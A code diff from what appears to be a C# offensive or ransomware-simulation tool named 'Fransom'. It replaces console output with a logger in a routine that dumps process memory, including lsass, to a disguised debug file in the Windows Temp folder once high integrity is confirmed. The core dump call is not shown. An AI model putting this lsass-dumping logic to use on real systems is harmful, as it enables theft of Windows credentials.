@@ -38,14 +38,14 @@ namespace Fransom
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine(String.Format("\n[X]Exception: {0}\n", ex.Message));
+                    Logger.WriteLine(String.Format("\n[X]Exception: {0}\n", ex.Message));
                     return;
                 }
             }
 
             if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity())
             {
-                Console.WriteLine("\n[X] Not in high integrity, unable to MiniDump!\n");
+                Logger.WriteLine("\n[X] Not in high integrity, unable to MiniDump!\n");
                 return;
             }
 
@@ -56,7 +56,7 @@ namespace Fransom
             }
             catch (Exception ex)
             {
-                Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
+                Logger.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                 return;
             }
             bool bRet = false;
@@ -65,7 +65,7 @@ namespace Fransom
             string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
             string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);
 
-            Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
+            Logger.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
 
             using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
             {
@@ -74,11 +74,11 @@ namespace Fransom
 
             if (bRet)
             {
-                Console.WriteLine("[+] Dump successful, dump file at {0}", dumpFile);
+                Logger.WriteLine(String.Format("[+] Dump successful, dump file at {0}", dumpFile));
             }
             else
             {
-                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
+                Logger.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
             }
         }
 
@@ -88,7 +88,7 @@ namespace Fransom
             string dumpDir = String.Format("{0}\\Temp\\", systemRoot);
             if (!Directory.Exists(dumpDir))
             {
-                Console.WriteLine(String.Format("\n[X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
+                Logger.WriteLine(String.Format("\n[X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
                 return;
             }
 
